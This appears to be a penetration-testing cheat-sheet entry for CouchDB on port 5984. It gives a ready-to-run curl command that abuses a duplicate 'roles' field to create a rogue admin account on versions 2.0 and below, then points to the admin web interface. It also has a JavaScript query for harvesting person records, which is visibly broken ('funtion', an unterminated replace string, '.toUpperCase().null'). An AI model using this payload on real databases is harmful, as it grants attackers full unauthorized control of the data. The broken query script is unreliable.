# Port 5984 - CouchDB
If TCP port 5984 http is open and CouchDD version 2.0 and below is running, admin level access to the database can be granted with a simple curl command. Once the curl command is executed and goes through successfully, you can browse to the database web application and have full access over the web page.

Create an admin user on the database\
`curl -X PUT -d '{"type":"user","name":"pwnedu","roles":["_admin"],"roles":[],"password":"pwnedu"}' http://<ip-address>:5984/_users/org.couchdb.user:pwnedu -H "Content-Type:application/json"`\
  - **The "name" and "password" fields can be changed to whatever you like**

Browse to the database web application\
`http://<ip-address>:5984/_utils`

CouchDB is a NoSQL database and queries are made via JavaScript. Before you start to query the database, you first need to browse to the person (or similar) table to see what syntax is used for names (ie. Joe, joe, JOE). To speed up the query process, use this script\
`funtion(doc){
if (doc.$doctype === "person" && doc.lastName === "Dirt" && doc.firstName === "Joe")
  {
    emit(doc.lastName.replace(/[_\d\W]/g,").toUpperCase().null);
  }
}`

  - The query may take a few minutes to process, so give it time

**NEED TO ADD EXPLOITS FOR VERSION 2.1 AND GREATER**
